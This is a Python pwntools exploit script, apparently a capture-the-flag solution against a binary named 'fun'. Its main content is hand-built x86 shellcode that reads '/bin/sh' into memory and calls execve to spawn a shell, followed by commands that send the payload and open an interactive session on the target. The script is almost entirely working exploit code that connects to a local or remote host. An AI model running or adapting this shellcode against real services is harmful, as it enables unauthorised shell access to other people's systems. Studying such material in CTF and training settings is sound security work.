#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./fun")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
payload = asm("""
// edx=count=0x8
xor eax, eax
add al, 0x8
mov edx, eax

// ecx=buffer=0x0804a028
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
add al, 0x4
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
add al, 0xa0
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
shl eax
add al, 0x28
mov ecx, eax

// so we don't have to write this again
push ecx; nop

// ebx=fd=0
xor ebx, ebx

// eax=syscall_num=3
xor eax, eax
add al, 0x3

// call read(0, 0x0804a028, 0x8)
int 0x80

// call execve("/bin/sh", NULL, NULL)
xor eax, eax
add al, 0xb
pop ebx; nop
xor ecx, ecx
xor edx, edx
int 0x80
""")

assert payload == bytes.fromhex("31C0040889C2D1E0D1E0D1E0D1E0D1E0D1E0D1E0D1E00404D1E0D1E0D1E0D1E0D1E0D1E0D1E0D1E004A0D1E0D1E0D1E0D1E0D1E0D1E0D1E0D1E0042889C1519031DB31C00403CD8031C0040B5B9031C931D2CD80")

io.sendline(payload)
io.sendline(b"/bin/sh\x00")
io.interactive()
